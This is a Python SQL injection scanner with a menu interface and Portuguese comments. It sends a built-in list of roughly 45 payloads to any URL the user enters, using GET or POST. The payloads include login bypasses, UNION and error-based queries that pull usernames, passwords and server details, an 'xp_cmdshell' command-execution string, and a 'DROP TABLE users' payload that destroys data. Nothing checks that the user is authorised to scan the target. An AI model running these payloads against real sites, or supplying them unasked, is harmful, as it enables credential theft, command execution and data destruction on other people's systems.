#!/usr/bin/env python3
# SQL Injection Scanner with Menu Interface
# Author: Your Name
# Version: 1.0

import os
import requests
import sys
import time
from urllib.parse import urljoin, urlparse

# Função para limpar o terminal
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner com símbolos de quadrados
BANNER = """
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                      ▓
▓  ███████╗ ██████╗ ██╗         ██╗███╗   ██╗██████╗ ███████╗████████╗ ▓
▓  ██╔════╝██╔═══██╗██║         ██║████╗  ██║██╔══██╗██╔════╝╚══██╔══╝ ▓
▓  ███████╗██║   ██║██║         ██║██╔██╗ ██║██║  ██║█████╗     ██║    ▓
▓  ╚════██║██║   ██║██║         ██║██║ ╚████║██║  ██║██╔══╝     ██║    ▓
▓  ███████║╚██████╔╝███████╗    ██║██║  ╚███║██████╔╝███████╗   ██║    ▓
▓  ╚══════╝ ╚═════╝ ╚══════╝    ╚═╝╚═╝   ╚══╝╚═════╝ ╚══════╝   ╚═╝    ▓
▓                                                                      ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
"""

# Payloads SQL Injection para testar
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "' OR ''='",
    "' OR 1=1#",
    "\" OR 1=1--",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT null, username, password FROM users--",
    "' UNION SELECT 1,@@version,3,4,5--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
    "' EXEC xp_cmdshell('dir')--",
    "' WAITFOR DELAY '0:0:5'--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--",
    "' OR (SELECT COUNT(*) FROM users) > 0--",
    "' OR (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables)='a'--",
    "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 OFFSET 1--",
    "' OR 1=1; DROP TABLE users--",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(10000000,MD5(NOW()))--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CURRENT_USER() AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(database() AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@version AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@datadir AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@hostname AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@basedir AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@tmpdir AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@log_error AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@version_compile_os AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@version_compile_machine AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@gtid_mode AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@innodb_version AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@version_comment AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@version AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@have_ssl AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@have_symlink AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(@@have_dynamic_loading AS CHAR),0x7e)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
]

def display_menu():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                     SQLi SCANNER MENU                      ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓ 1. Scan URL for SQLi vulnerabilities (GET)                 ▓")
    print("▓ 2. Scan URL for SQLi vulnerabilities (POST)                ▓")
    print("▓ 3. List all payloads                                      ▓")
    print("▓ 4. Exit                                                   ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def scan_url(url, method='GET', params=None):
    print(f"\n▓ Scanning: {url}")
    print(f"▓ Method: {method}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    
    vulnerable = False
    tested_payloads = 0
    
    try:
        for payload in SQLI_PAYLOADS:
            tested_payloads += 1
            try:
                # Exibe o payload sendo testado
                print(f"▓ Testing payload {tested_payloads}/{len(SQLI_PAYLOADS)}: {payload[:50]}...", end='\r')
                
                if method == 'GET':
                    # Testa em parâmetros da URL
                    test_url = url + ("&" if "?" in url else "?") + "test=" + requests.utils.quote(payload)
                    response = requests.get(test_url, timeout=10)
                else:
                    # Testa em dados POST
                    data = params.copy() if params else {}
                    data['test'] = payload
                    response = requests.post(url, data=data, timeout=10)
                
                # Verifica por indicadores de vulnerabilidade
                error_keywords = [
                    'SQL syntax', 'MySQL', 'ORA-', 'syntax error', 
                    'unclosed quotation mark', 'quoted string not properly terminated',
                    'SQL Server', 'PostgreSQL', 'JDBC', 'ODBC', 'MySQLi',
                    'Driver', 'database', 'query failed', 'syntax near'
                ]
                
                if any(keyword.lower() in response.text.lower() for keyword in error_keywords):
                    print(f"▓ [VULNERABLE] SQLi found with payload: {payload}")
                    vulnerable = True
                else:
                    print(f"▓ [-] Payload {tested_payloads} failed", end='\r')
                
                # Indicador de progresso
                if tested_payloads % 5 == 0:
                    print(f"▓ Tested {tested_payloads}/{len(SQLI_PAYLOADS)} payloads...", end='\r')
                
            except requests.exceptions.RequestException as e:
                print(f"▓ Error testing payload: {str(e)[:50]}...")
                continue
            except KeyboardInterrupt:
                print("\n▓ Scan interrupted by user")
                return
            
    except Exception as e:
        print(f"▓ Unexpected error: {e}")
    
    if not vulnerable:
        print("\n▓ No SQL injection vulnerabilities detected with the tested payloads.")
    else:
        print("\n▓ SQL injection vulnerabilities were found! Please secure your application.")
    
    print(f"▓ Total payloads tested: {tested_payloads}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def list_payloads():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                      SQLi PAYLOADS LIST                     ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    for i, payload in enumerate(SQLI_PAYLOADS, 1):
        print(f"▓ {i:2d}. {payload}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def wait_and_clear():
    input("\n▓ Press Enter to continue...")
    clear_screen()

def main():
    clear_screen()
    print(BANNER)
    
    while True:
        display_menu()
        try:
            choice = input("\n▓ Select an option (1-4): ").strip()
            
            if choice == "1":
                clear_screen()
                url = input("▓ Enter URL to scan (e.g., http://example.com/page?id=1): ").strip()
                if not url.startswith(('http://', 'https://')):
                    print("▓ Error: URL must start with http:// or https://")
                    wait_and_clear()
                    continue
                scan_url(url)
                wait_and_clear()
            elif choice == "2":
                clear_screen()
                url = input("▓ Enter URL for POST scan: ").strip()
                if not url.startswith(('http://', 'https://')):
                    print("▓ Error: URL must start with http:// or https://")
                    wait_and_clear()
                    continue
                params = input("▓ Enter parameters to test (format: param1=value1,param2=value2): ").strip()
                param_dict = {}
                if params:
                    for pair in params.split(','):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            param_dict[key.strip()] = value.strip()
                scan_url(url, method='POST', params=param_dict)
                wait_and_clear()
            elif choice == "3":
                clear_screen()
                list_payloads()
                wait_and_clear()
            elif choice == "4":
                clear_screen()
                print("▓ Exiting SQLi Scanner. Goodbye!")
                print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
                sys.exit(0)
            else:
                print("▓ Invalid choice. Please select 1-4.")
                wait_and_clear()
                
        except KeyboardInterrupt:
            clear_screen()
            print("\n▓ Exiting SQLi Scanner. Goodbye!")
            print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
            sys.exit(0)
        except Exception as e:
            print(f"▓ Error: {e}")
            wait_and_clear()
            continue

if __name__ == "__main__":
    main()
